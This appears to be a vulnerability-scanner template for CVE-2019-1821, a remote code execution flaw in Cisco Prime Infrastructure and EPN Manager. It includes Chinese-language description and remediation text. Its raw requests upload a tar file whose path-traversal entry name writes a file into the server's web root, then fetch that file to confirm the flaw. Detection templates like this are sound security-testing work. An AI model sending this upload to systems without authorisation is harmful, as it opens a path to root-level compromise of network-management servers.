id: CVE-2019-1821
info:
  name: Cisco Prime Infrastructure and Cisco Evolved Programmable Network Manager
    - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Cisco Prime Infrastructure Software和Cisco Evolved Programmable Network Manager 输入验证错误漏洞
    Cisco Prime Infrastructure（PI）和Cisco Evolved Programmable Network（EPN）Manager的基于web的管理界面中存在一个漏洞，允许经过身份验证的远程攻击者以根级权限在底层操作系统上执行代码。存在此漏洞是因为软件未正确验证用户提供的输入。攻击者可以通过将恶意文件上载到管理web界面来利用此漏洞进行攻击。成功利用此漏洞可使攻击者以根级别权限在底层操作系统上执行代码。
  severity: critical
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190515-pi-rce

    临时修复方案：
    1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
    2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - status_code == 200
    - contains((body_2), '{{randstr}}')
  raw:
  - |
    POST /servlet/UploadServlet HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Primary-IP: 127.0.0.1
    Filename: test.tar
    Filesize: 10240
    Compressed-Archive: false
    Destination-Dir: tftpRoot
    Filecount: 1
    Content-Length: 269
    Content-Type: multipart/form-data; boundary=871a4a346a547cf05cb83f57b9ebcb83

    --871a4a346a547cf05cb83f57b9ebcb83
    Content-Disposition: form-data; name="files"; filename="test.tar"

    ../../opt/CSCOlumos/tomcat/webapps/ROOT/test.txt0000644000000000000000000000000400000000000017431 0ustar  00000000000000{{randstr}}
    --871a4a346a547cf05cb83f57b9ebcb83--
  - |
    GET /test.txt HTTP/1.1
    Host: {{Host}}
  req-condition: true
